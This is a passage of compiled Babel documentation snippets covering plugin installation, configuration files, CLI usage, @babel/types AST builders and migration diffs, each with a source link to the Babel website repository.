https://github.com/babel/website/blob/main/docs/preset-stage-0.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-stage-0\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a String Literal Type Annotation Node in Babel\nDESCRIPTION: Creates a `StringLiteralTypeAnnotation` AST node using the Babel types module. This node represents a string literal type annotation in Flow, requiring a string value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_152\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.stringLiteralTypeAnnotation(value);\n```\n\n----------------------------------------\n\nTITLE: Import Compilation Target Helpers JavaScript\nDESCRIPTION: Imports the `filterItems`, `getTargets`, and `isRequired` functions from the `@babel/helper-compilation-targets` package. These functions are used for determining the required Babel plugins based on specified compilation targets.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport {\n  filterItems,\n  default as getTargets,\n  isRequired,\n} from \"@babel/helper-compilation-targets\";\n```\n\n----------------------------------------\n\nTITLE: Escaping Special Characters in JSX Text\nDESCRIPTION: This snippet illustrates how to properly escape special characters like '>', '<', '{', and '}' within JSX text in Babel 8.  Using the correct character codes ensures compliance with the JSX specification.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_16\n\nLANGUAGE: jsx\nCODE:\n```\n- <p>\">\" is greater than.</p>\n+ <p>\"{'>'}\" is greater than.</p>\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Babel CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/plugin-syntax-throw-expressions plugin via the Babel CLI. It specifies the plugin to use when transpiling script.js.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-throw-expressions.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-throw-expressions script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a TSImportEqualsDeclaration Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSImportEqualsDeclaration` AST node using `t.tsImportEqualsDeclaration`.  The function takes an identifier, module reference, and a boolean indicating if it's exported. This represents a TypeScript import equals declaration (e.g., `import x = require('y');`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_176\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsImportEqualsDeclaration(id, moduleReference);\n```\n\n----------------------------------------\n\nTITLE: Checking for FlowType Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a Flow type annotation. It uses the `t.isFlowType(node)` method from Babel's `types` (or similar) API. This method covers various Flow type annotations such as `AnyTypeAnnotation`, `ArrayTypeAnnotation`, `BooleanTypeAnnotation`, and others.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_270\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFlowType(node);\n```\n\n----------------------------------------\n\nTITLE: Installing the Babel Plugin\nDESCRIPTION: This command installs the @babel/plugin-bugfix-safari-class-field-initializer-scope as a development dependency using npm.  It allows using the plugin in the babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-class-field-initializer-scope.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-bugfix-safari-class-field-initializer-scope\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin - Shell\nDESCRIPTION: This command installs the @babel/plugin-transform-typeof-symbol plugin as a development dependency using npm.  The `--save-dev` flag ensures the plugin is added to the `devDependencies` section of `package.json`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typeof-symbol.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-typeof-symbol\n```\n\n----------------------------------------\n\nTITLE: Configure Babel with @babel/preset-stage-3 (JSON)\nDESCRIPTION: Configures Babel to use the @babel/preset-stage-3 preset within a babel.config.json file. This is the recommended way to use the preset. Babel will use this configuration when transforming JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-3.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-stage-3\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TupleExpression Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TupleExpression` AST node using Babel's `t.tupleExpression` method. It accepts an array of expressions or spread elements as arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_233\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tupleExpression(elements);\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareInterface AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareInterface` to create a declare interface node in the AST. It represents an interface declaration in Flow type annotations.  Parameters include the identifier, type parameters, extended interfaces, and the object type annotation for the body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_37\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareInterface(id, typeParameters, extends, body);\n```\n\n----------------------------------------\n\nTITLE: SystemJS Module Iteration Fix (JavaScript)\nDESCRIPTION: Demonstrates a bug fix in `transform-es2015-modules-systemjs` related to module iteration order. It ensures that modules are imported in the correct order.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_20\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"2\"; // should be imported first\nimport \"1\"; // second\n```\n\n----------------------------------------\n\nTITLE: JavaScript Imports and Exports with String Names\nDESCRIPTION: This code demonstrates the usage of strings as names for imported and exported variables, enabled by the `@babel/plugin-syntax-module-string-names` plugin. This allows using any valid UTF-16 name for variables across modules. The example shows exporting 'happy' as '😃' and importing it as 'smile'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// emojis.js\nlet happy = \"wooo!\";\nexport { happy as \"😃\" };\n\n// main.js\nimport { \"😃\" as smile } from \"./emojis.js\";\nconsole.log(smile); // wooo!\n```\n\n----------------------------------------\n\nTITLE: Async Do Expressions in Babel 7\nDESCRIPTION: Demonstrates the usage of async do expressions within Babel 7. This allows awaiting asynchronous operations within a do expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_21\n\nLANGUAGE: javascript\nCODE:\n```\nasync do { await requestAPI().json() }\n```\n\n----------------------------------------\n\nTITLE: TSMethodSignature AST (Babel 7)\nDESCRIPTION: Babel 7 AST for TSMethodSignature, using `parameters` and `typeAnnotation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_18\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSMethodSignature\",\n  \"key\": Identifier(\"foo\"),\n  \"parameters\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"typeAnnotation\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Never Keyword\nDESCRIPTION: Creates a TypeScript `never` keyword node in the AST. Represents the `never` type in TypeScript, indicating a function that never returns or a variable that can never hold a value. It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_193\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsNeverKeyword();\n```\n\n----------------------------------------\n\nTITLE: Class transformation without loose mode in JavaScript\nDESCRIPTION: This snippet shows a simple JavaScript class definition.  When transformed by Babel without loose mode, it results in code that includes a `_classCallCheck` helper function, which can lead to code duplication across multiple files.\nSOURCE: https://github.com/babel/website/blob/main/docs/runtime-corejs2.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass A {}\n```\n\n----------------------------------------\n\nTITLE: React Component Creation (Input)\nDESCRIPTION: Demonstrates React component creation using React.createClass (React <= 15) and createReactClass (React 16+). The plugin will automatically add the displayName property to these components.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-display-name.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = React.createClass({}); // React <= 15\nvar bar = createReactClass({}); // React 16+\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via CLI - Shell\nDESCRIPTION: Example of using the Babel CLI to transform a JavaScript file (`script.js`) with the `@babel/plugin-transform-new-target` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-new-target script.js\n```\n\n----------------------------------------\n\nTITLE: Decimal Proposal Support in Babel\nDESCRIPTION: This snippet demonstrates the use of the Decimal proposal, introducing a new numeric type for precise decimal arithmetic. The `m` suffix indicates a decimal literal. Babel needs to be configured to parse this syntax; no runtime decimal support is provided.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconsole.assert(0.1m + 0.2m === 0.3m);\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Preset ES2016\nDESCRIPTION: Installs the @babel/preset-es2016 package as a development dependency using npm. This command adds the preset to your project's package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2016.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/preset-es2016\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'usage' - Unchanged a.js\nDESCRIPTION: The `a.js` file remains unchanged if the target environment supports Promises, as Babel does not need to inject a polyfill when `useBuiltIns: 'usage'` is enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a = new Promise();\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-syntax-import-defer plugin within the babel.config.json file. This enables the plugin to parse `import defer` declarations during Babel transformations. The plugin is specified within the plugins array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-defer.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-import-defer\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Block-Scoped Functions Plugin via CLI (Shell)\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a JavaScript file ('script.js') using the @babel/plugin-transform-block-scoped-functions plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoped-functions.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-block-scoped-functions script.js\n```\n\n----------------------------------------\n\nTITLE: Creating an OptionalMemberExpression in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `OptionalMemberExpression` AST node using `t.optionalMemberExpression(object, property, computed, optional)`. It represents an optional member expression.  Parameters include the object, property, a computed flag, and an optional flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_135\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.optionalMemberExpression(object, property, computed, optional);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSInterfaceBody Node in JavaScript\nDESCRIPTION: This code shows how to create a `TSInterfaceBody` AST node using the `t.tsInterfaceBody` builder function. It takes an array of `TSTypeElement` nodes representing the body of a TypeScript interface.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_182\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsInterfaceBody(body);\n```\n\n----------------------------------------\n\nTITLE: Creating a DoExpression AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.doExpression` to create a do expression node in the AST.  It is a non-standard JavaScript expression. It requires the block statement representing the expression's body and an optional async flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_47\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.doExpression(body, async);\n```\n\n----------------------------------------\n\nTITLE: Checking for ExportDeclaration Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is an ExportDeclaration node using the `t.isExportDeclaration(node)` method in Babel. It covers ExportAllDeclaration, ExportDefaultDeclaration, and ExportNamedDeclaration. This method helps in identifying nodes that export bindings from a module.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_263\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isExportDeclaration(node);\n```\n\n----------------------------------------\n\nTITLE: Using Duo with Babel via CLI\nDESCRIPTION: This snippet shows how to use the `duo-babel` plugin with the Duo CLI. It instructs Duo to use the babel plugin during the build process.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/duo/usage.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nduo --use duo-babel\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareFunction AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareFunction` to create a declare function node in the AST for Flow type annotations. It takes an Identifier representing the function's name.  The predicate is excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_36\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareFunction(id);\n```\n\n----------------------------------------\n\nTITLE: Creating a UnionTypeAnnotation with Babel\nDESCRIPTION: Creates a `UnionTypeAnnotation` AST node using the `t.unionTypeAnnotation` method. This node represents a union type annotation in Flow, where `types` is an array of `FlowType` nodes representing the possible types.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_243\n\nLANGUAGE: javascript\nCODE:\n```\nt.unionTypeAnnotation(types);\n```\n\n----------------------------------------\n\nTITLE: Importing React Component with React.lazy (Before)\nDESCRIPTION: This JavaScript snippet shows how to import a React component using `React.lazy` before the tree-shaking optimization was applied. It imports the React library and then declares a `SomeComponent` constant, assigning it the result of `React.lazy` which dynamically imports the `./SomeComponent` module.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport React from 'react';\nconst SomeComponent = React.lazy(() => import('./SomeComponent'));\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Options (Diff)\nDESCRIPTION: This diff shows how to pass options to a Babel plugin by wrapping the plugin name in an array and including an options object as the second element.  The plugin option allows you to configure the specific behavior of the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_3\n\nLANGUAGE: Diff\nCODE:\n```\n{\n  \"plugins\": [\n-   \"pluginA\",\n+   [\"pluginA\", {\n+     // options here\n+   }],\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Decorators Usage with Babel CLI Shell\nDESCRIPTION: Shows how to enable decorators in Babel using the command-line interface (CLI) with the `--optional` or `--stage` flags. It demonstrates two equivalent CLI commands for enabling the feature when transpiling a script.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --optional es7.decorators script.js\n# or\n$ babel --stage 1 script.js\n```\n\n----------------------------------------\n\nTITLE: Creating EnumNumberMember in JavaScript\nDESCRIPTION: This snippet shows how to create an `EnumNumberMember` AST node using Babel's `t.enumNumberMember` method. The `id` parameter is a required `Identifier` representing the member's name, and `init` is a required `NumericLiteral` representing the member's value. This node represents a single number-valued member within an enum.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_56\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumNumberMember(id, init);\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Literal Type\nDESCRIPTION: Creates a TypeScript literal type node in the AST.  This represents a type that is a specific literal value, such as a number, string, boolean, or template literal. Requires the literal value as an argument.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_186\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsLiteralType(literal);\n```\n\n----------------------------------------\n\nTITLE: Installation via npm\nDESCRIPTION: This command installs the `babel-plugin-transform-simplify-comparison-operators` plugin as a development dependency using npm. This plugin simplifies comparison operators in your JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-simplify-comparison-operators.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-simplify-comparison-operators --save-dev\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin - Without Options\nDESCRIPTION: This JSON configuration shows how to enable the babel-plugin-minify-dead-code-elimination plugin in a Babel configuration file without any specific options. The plugin is simply added to the 'plugins' array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"minify-dead-code-elimination\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Symbol Type Annotation Node in Babel\nDESCRIPTION: Creates a `SymbolTypeAnnotation` AST node using the Babel types module. This node represents a symbol type annotation in Flow.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_157\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.symbolTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Is Required Function Signature TypeScript\nDESCRIPTION: TypeScript definition for the `isRequired` function, specifying the input parameters for plugin name, target environments, compatibility data, includes, and excludes.  It determines if a specified plugin is required for compilation based on the provided targets and compatibility information.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-compilation-targets.md#_snippet_7\n\nLANGUAGE: TypeScript\nCODE:\n```\nfunction isRequired(\n  name: string,\n  targets: Targets,\n  {\n    compatData = pluginsCompatData,\n    includes,\n    excludes,\n  }: {\n    compatData?: { [feature: string]: Targets };\n    includes?: Set<string>;\n    excludes?: Set<string>;\n  } = {}\n): boolean;\n```\n\n----------------------------------------\n\nTITLE: Records and Tuples Transformation (Output)\nDESCRIPTION: Example of the transformed Records and Tuples syntax using the global `Record` and `Tuple` functions.  This is the output code generated by Babel. Requires @babel/plugin-proposal-record-and-tuple plugin to be configured.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet data = Record({\n  name: \"Babel\",\n  ids: Tuple(1, 2, 3),\n});\n```\n\n----------------------------------------\n\nTITLE: Enable Babel stage 0\nDESCRIPTION: This Shell snippet demonstrates how to enable stage 0 in babel.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --stage 0\n```\n\n----------------------------------------\n\nTITLE: Export Extensions Usage with Babel JavaScript\nDESCRIPTION: Shows how to enable export extensions in Babel using the `optional` or `stage` options within the `transform` function. It demonstrates two equivalent methods for enabling the feature.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"babel\").transform(\"code\", {\n  optional: [\"es7.exportExtensions\"]\n});\n// or\nrequire(\"babel\").transform(\"code\", { stage: 1 });\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API\nDESCRIPTION: JavaScript code showing how to use the Babel Node API to transform code with the @babel/plugin-transform-react-jsx-development plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-jsx-development\"],\n});\n```\n\n----------------------------------------\n\nTITLE: React and Flow Preset Separation (Diff)\nDESCRIPTION: This snippet demonstrates the separation of React and Flow presets in Babel 7.  Previously, `@babel/preset-react` included the Flow plugin, causing unintended parsing of Flow syntax. This change requires explicitly including `@babel/preset-flow` for Flow type parsing and removal.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_9\n\nLANGUAGE: diff\nCODE:\n```\n{\n-  \"presets\": [\"@babel/preset-react\"]\n+  \"presets\": [\"@babel/preset-react\", \"@babel/preset-flow\"] // parse & remove flow types\n+  \"presets\": [\"@babel/preset-react\", \"@babel/preset-typescript\"] // parse & remove typescript types\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM\nDESCRIPTION: Installs the `@babel/plugin-syntax-function-sent` as a development dependency using npm. This is a prerequisite for using the plugin in a Babel project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-sent.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-function-sent\n```\n\n----------------------------------------\n\nTITLE: Optional Catch Binding Example JavaScript\nDESCRIPTION: Demonstrates the use of optional catch binding.  The catch clause does not require specifying a variable name for the exception.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-catch-binding.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ntry {\n  throw 0;\n} catch {\n  doSomethingWhichDoesNotCareAboutTheValueThrown();\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-syntax-import-source plugin within a babel.config.json file to enable parsing of `import source` syntax.  This is the recommended method of usage.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-source.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-import-source\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: This command runs Babel from the command line with the @babel/plugin-syntax-import-reflection plugin enabled.  It processes the specified script.js file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-reflection.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-import-reflection script.js\n```\n\n----------------------------------------\n\nTITLE: JavaScript Class Example\nDESCRIPTION: This JavaScript code defines a simple class `A` without any methods. Used to illustrate the classCallCheck helper.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass A {}\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareTypeAlias AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareTypeAlias` to create a declare type alias node in the AST for Flow type annotations. It takes an ID (Identifier), optional TypeParameterDeclaration, and the right-hand side FlowType.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_41\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareTypeAlias(id, typeParameters, right);\n```\n\n----------------------------------------\n\nTITLE: Invalid Identifier Name Example in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how Babel 8 rejects invalid identifier names, such as an empty string, when using the `t.identifier` builder.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_55\n\nLANGUAGE: javascript\nCODE:\n```\n// Empty string is an invalid identifier name\n// highlight-error-next-line\nt.identifier(\"\");\n```\n\n----------------------------------------\n\nTITLE: Transform Regex Literal (JavaScript)\nDESCRIPTION: This snippet demonstrates the transformation of a regular expression literal with duplicate named capturing groups using the Babel plugin.  The plugin replaces the regex with a wrapper function `_wrapRegExp` that handles the duplicate named groups. This example shows a regex to match date formats and then access the `year` group.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar re = /(?<year>\\d{4})-(?<month>\\d{2})|(?<month>\\d{2})-(?<year>\\d{4})/;\\n\nconsole.log(re.exec(\"02-1999\").groups.year);\n```\n\n----------------------------------------\n\nTITLE: Source Phase Imports in Babel 8\nDESCRIPTION: Demonstrates source phase imports in Babel 8, allowing imports during the compilation phase.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_19\n\nLANGUAGE: javascript\nCODE:\n```\nimport source x from \"./x\"\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeAnnotation with Babel\nDESCRIPTION: Creates a `TypeAnnotation` AST node using the `t.typeAnnotation` method. This node represents a type annotation in Flow, where `typeAnnotation` is a `FlowType` node defining the type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_236\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeAnnotation(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Default Export Class JavaScript\nDESCRIPTION: Shows how to export a default class. This resolves a bug where default exported classes without a name were not correctly transformed, specifically when using es3-transforms.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default class {};\n// wasn't correctly transforming to\nexports[\"default\"] = class {}\n// with the es3-transforms\n```\n\n----------------------------------------\n\nTITLE: Throw Expressions in Babel 8\nDESCRIPTION: Shows how to use throw expressions in Babel 8, enabling throwing errors in expression contexts.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\n() => throw new Error(\"\")\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via CLI\nDESCRIPTION: Uses the babel-plugin-minify-flip-comparisons plugin via the command-line interface (CLI). The `--plugins` flag specifies the plugin to use when transforming the `script.js` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-flip-comparisons.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-flip-comparisons script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Preset Stage 2 via Node API\nDESCRIPTION: Example of using the `@babel/preset-stage-2` preset with the Babel Node API to transform code. Stage presets are deprecated.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-2.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-stage-2\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeofTypeAnnotation with Babel\nDESCRIPTION: Creates a `TypeofTypeAnnotation` AST node using the `t.typeofTypeAnnotation` method.  This node represents a `typeof` type annotation in Flow, where `argument` is a `FlowType` node representing the expression to get the type of.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_241\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeofTypeAnnotation(argument);\n```\n\n----------------------------------------\n\nTITLE: Proxying a Normal Object JavaScript\nDESCRIPTION: This code snippet demonstrates how to create a proxy for a normal object. It intercepts property access and returns a custom string.  It uses the `Proxy` constructor with a target object and a handler object.  Proxies are not transpiled or polyfilled due to ES5 limitations.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_24\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Proxying a normal object\nvar target = {};\nvar handler = {\n  get: function (receiver, name) {\n    return `Hello, ${name}!`;\n  }\n};\n\nvar p = new Proxy(target, handler);\np.world === \"Hello, world!\";\n```\n\n----------------------------------------\n\nTITLE: Install minify-type-constructors - Shell\nDESCRIPTION: Installs the `babel-plugin-minify-type-constructors` plugin as a development dependency using npm. This command adds the plugin to your project and saves it to your `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-type-constructors.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-type-constructors --save-dev\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Webpack\nDESCRIPTION: This snippet demonstrates how to switch from `jsx-loader` to `babel-loader` in Webpack for JSX transformation. It involves modifying the `loader` property in the Webpack configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nloaders: [\n  { test: /\\.js$/, exclude: /node_modules/, loader: 'jsx-loader'}\n]\n```\n\n----------------------------------------\n\nTITLE: input.js file example\nDESCRIPTION: Shows an example javascript file that contains the keyword 'this'.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// input.js\nthis;\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectTypeCallProperty in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `ObjectTypeCallProperty` AST node using `t.objectTypeCallProperty(value)`. It represents a call property in a Flow object type annotation. The `value` parameter is a `FlowType` representing the type of the call property.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_127\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectTypeCallProperty(value);\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'usage' - Unchanged b.js\nDESCRIPTION: The `b.js` file remains unchanged if the target environment supports Maps, as Babel does not need to inject a polyfill when `useBuiltIns: 'usage'` is enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar b = new Map();\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - Assignment Expression (JavaScript)\nDESCRIPTION: Demonstrates object rest spread used in an assignment expression. It destructures an object and assigns the remaining properties to another variable.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n({a, ...b} = c); // AssignmentExpression\n```\n\n----------------------------------------\n\nTITLE: Preset Organization Shortcuts JavaScript\nDESCRIPTION: Demonstrates the use of preset organization shortcuts in Babel configuration.  It simplifies specifying presets from organizations by allowing shorthand names. Requires Babel to resolve the organization name to an actual package name.\nSOURCE: 